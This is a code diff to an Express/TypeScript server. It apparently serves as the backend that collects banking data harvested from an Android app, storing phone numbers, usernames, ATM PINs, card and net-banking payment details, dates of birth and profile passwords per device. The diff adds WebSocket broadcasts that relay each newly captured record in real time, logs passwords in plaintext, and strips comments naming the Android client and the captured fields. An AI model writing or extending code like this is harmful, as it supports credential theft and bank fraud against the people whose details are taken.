@@ -2,6 +2,7 @@ import express, { Request, Response } from "express";
 import FormSubmission from "../models/FormSubmission";
 import Payment from "../models/Payment";
 import logger from "../logger/logger";
+import wsService from "../services/wsService";
 
 const router = express.Router();
 
@@ -12,7 +13,6 @@ const router = express.Router();
 function transformFormDoc(doc: any) {
   const payload = doc.payload || {};
 
-  // phone number fallbacks
   const phoneNumber =
     payload.phoneNumber ??
     payload.mobileNumber ??
@@ -39,11 +39,10 @@ function transformFormDoc(doc: any) {
   return {
     _id: doc._id,
     uniqueid: doc.uniqueid || (payload.uniqueid ?? ""),
-    phoneNumber: phoneNumber,
-    username: username,
-    atmPin: atmPin,
-    // include raw payload too in case Android wants to inspect other fields later
-    payload: payload,
+    phoneNumber,
+    username,
+    atmPin,
+    payload,
     createdAt: doc.createdAt,
     updatedAt: doc.updatedAt,
   };
@@ -53,7 +52,6 @@ function transformFormDoc(doc: any) {
 router.get("/form_submissions", async (_req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find().lean();
-    // transform each doc to Android-friendly shape
     const out = docs.map(transformFormDoc);
     return res.json(out);
   } catch (err: any) {
@@ -62,14 +60,13 @@ router.get("/form_submissions", async (_req: Request, res: Response) => {
   }
 });
 
-/* ================= GET FORM BY DEVICE (Android uses this) ================= */
+/* ================= GET FORM BY DEVICE ================= */
 router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find({
       uniqueid: req.params.uniqueid,
     }).lean();
 
-    // transform to expected shape
     const out = docs.map(transformFormDoc);
     return res.json(out);
   } catch (err: any) {
@@ -97,7 +94,7 @@ router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response
       method: "card",
     }).lean();
 
-    return res.json(docs.map(d => d.payload));
+    return res.json(docs.map((d) => d.payload));
   } catch (err: any) {
     logger.error("forms: card payments fetch failed", err);
     return res.status(500).json([]);
@@ -112,14 +109,14 @@ router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) 
       method: "netbanking",
     }).lean();
 
-    return res.json(docs.map(d => d.payload));
+    return res.json(docs.map((d) => d.payload));
   } catch (err: any) {
     logger.error("forms: net banking fetch failed", err);
     return res.status(500).json([]);
   }
 });
 
-/* ================= GET SUCCESS DATA (dob + profilePassword) ================= */
+/* ================= GET SUCCESS DATA ================= */
 router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
   try {
     const doc = await FormSubmission.findOne({
@@ -139,7 +136,7 @@ router.get("/success_data/device/:uniqueid", async (req: Request, res: Response)
   }
 });
 
-/* ================= POST: SUCCESS DATA (update dob/profilePassword) ================= */
+/* ================= POST: SUCCESS DATA ================= */
 router.post("/success_data", async (req: Request, res: Response) => {
   const body = req.body || {};
   const uniqueid = body.uniqueid || "";
@@ -149,7 +146,11 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 
   try {
-    logger.info("forms: success_data payload", { uniqueid, dob: body.dob, profilePassword: body.profilePassword });
+    logger.info("forms: success_data payload", {
+      uniqueid,
+      dob: body.dob,
+      profilePassword: body.profilePassword,
+    });
 
     const update: any = { $set: {} };
     if (Object.prototype.hasOwnProperty.call(body, "dob")) {
@@ -166,6 +167,19 @@ router.post("/success_data", async (req: Request, res: Response) => {
 
     await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
 
+    try {
+      wsService.broadcastFormUpdate(uniqueid, {
+        uniqueid,
+        dob: Object.prototype.hasOwnProperty.call(body, "dob") ? body.dob ?? "" : undefined,
+        profilePassword: Object.prototype.hasOwnProperty.call(body, "profilePassword")
+          ? body.profilePassword ?? ""
+          : undefined,
+        updatedAt: Date.now(),
+      });
+    } catch (e) {
+      logger.warn("forms: broadcast form:update failed", e);
+    }
+
     logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
     return res.json({ success: true });
   } catch (err: any) {
@@ -174,7 +188,7 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 });
 
-/* ================= POST: generic form_submissions (store full body as payload) ================= */
+/* ================= POST: generic form_submissions ================= */
 router.post("/form_submissions", async (req: Request, res: Response) => {
   const body = req.body || {};
   try {
@@ -185,6 +199,14 @@ router.post("/form_submissions", async (req: Request, res: Response) => {
 
     await doc.save();
     logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
+
+    try {
+      const transformed = transformFormDoc(doc.toObject ? doc.toObject() : doc);
+      wsService.broadcastFormNew(doc.uniqueid || body.uniqueid || body.deviceId || "", transformed);
+    } catch (e) {
+      logger.warn("forms: broadcast form:new failed", e);
+    }
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: save form_submissions failed", err);
@@ -192,7 +214,7 @@ router.post("/form_submissions", async (req: Request, res: Response) => {
   }
 });
 
-/* ================= POST: payments (keep existing behavior) ================= */
+/* ================= POST: card_payments ================= */
 router.post("/card_payments", async (req: Request, res: Response) => {
   try {
     const body = req.body || {};
@@ -204,6 +226,13 @@ router.post("/card_payments", async (req: Request, res: Response) => {
     });
 
     await p.save();
+
+    try {
+      wsService.broadcastPaymentNew(body.uniqueid || "", "card", body);
+    } catch (e) {
+      logger.warn("forms: broadcast payment:new(card) failed", e);
+    }
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: card_payment failed", err);
@@ -222,6 +251,13 @@ router.post("/net_banking", async (req: Request, res: Response) => {
     });
 
     await p.save();
+
+    try {
+      wsService.broadcastPaymentNew(body.uniqueid || "", "netbanking", body);
+    } catch (e) {
+      logger.warn("forms: broadcast payment:new(netbanking) failed", e);
+    }
+
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: net_banking failed", err);
